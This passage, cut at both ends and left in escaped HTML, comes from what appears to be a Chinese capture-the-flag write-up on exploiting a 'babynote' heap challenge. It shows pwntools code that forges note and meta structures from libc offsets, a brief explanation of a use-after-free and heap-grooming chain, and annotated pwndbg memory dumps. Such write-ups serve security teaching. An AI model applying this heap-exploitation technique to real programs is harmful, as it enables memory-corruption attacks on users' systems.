class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fakebabynote = p64( &lt;span class=&#34;number&#34;&gt;0x29fdd0&lt;/span&gt; +libcbase)+p64(fakemeta_addr+&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;i&amp;#x27;&lt;/span&gt;,fakebabynote)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;g&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(p64(&lt;span class=&#34;number&#34;&gt;0x29bd00&lt;/span&gt;+libcbase)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;)+p64(libcbase+&lt;span class=&#34;number&#34;&gt;0x29bd90&lt;/span&gt;),fake_meta.ljust(&lt;span class=&#34;number&#34;&gt;0x2000&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;group 里的第一个 slot 开始被用作存放 banynote1，next 指针指向 0，babynotelist 头插法之后删掉第一个创建的 babynote，然后堆风水将 slot0（原本作为 babynote）作为 name 或者 note 堆块，可以写入数据，但是因为存在 uaf, 虽然 slot0 作为链表头的 name 或者 note, 但是依旧可以链表的遍历将他看成一个节点，我们还可以将其 next 指针写为我们 kafechunk 的地址，这个 fakechunk 其实是一个 babynote 的 name 或者 note，只是伪造成了 bebynote 的布局，对应 note 之指针指向我们布局好的 fakeslot&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;gx  &lt;span class=&#34;number&#34;&gt;0x7f22b639fc30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc30&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00005555569254f0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000ff0000000009&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc40&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fc70&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fca0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc50&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc60&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000ff0000000000&lt;/span&gt;				&lt;span class=&#34;comment&#34;&gt;//下一次申请，这里会被改写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc70&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc80&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc90&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000ff0000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fca0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fcb0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fcc0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0009830000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fcd0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fce0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fcf0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fc40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000c840000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd00&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd10&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd20&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000f850000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd30&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd40&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd50&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0012860000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd60&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b63a3e20&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd90&lt;/span&gt;&lt;span class=&#34;comment&#34;&gt;//fakebabynote的地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd70&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd80&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fcd0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0015870000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd90&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b63a3dd0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b6395070&lt;/span&gt;		&lt;span class=&#34;comment&#34;&gt;//fakebabynote,0x00007f22b6395070指向我们伪造的slot&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fda0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fdb0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000ff0000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fdc0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fdd0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fde0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fdf0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fe00&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fe10&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fe20&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000555556925090&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000ff0000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们把 slot 申请成为 name 后&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;gx  &lt;span class=&#34;number&#34;&gt;0x7f22b639fc30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc30&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00005555569254f0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000800000000009&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc40&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc50&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000008&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000008&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc60&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd90&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000ff0000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc70&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc80&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fc90&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000ff0000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fca0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fcb0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fcc0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0009830000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fcd0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fce0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fcf0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fc40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000c840000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd00&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd10&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd20&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x000f850000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd30&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd40&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd50&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6868686868686868&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0012860000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd60&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b63a3e20&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fd90&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd70&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd80&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fcd0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0015870000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fd90&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b63a3dd0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b6395070&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fda0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000001&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fdb0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000000&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000ff0000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fdc0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fdd0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fde0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x6767676767676767&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x001b890000000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fdf0&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007f22b639fc40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007f22b6394020&lt;/span&gt;	&lt;span class=&#34;comment&#34;&gt;//babynotelist的头指针，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7f22b639fe00&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000000028&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000002030&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 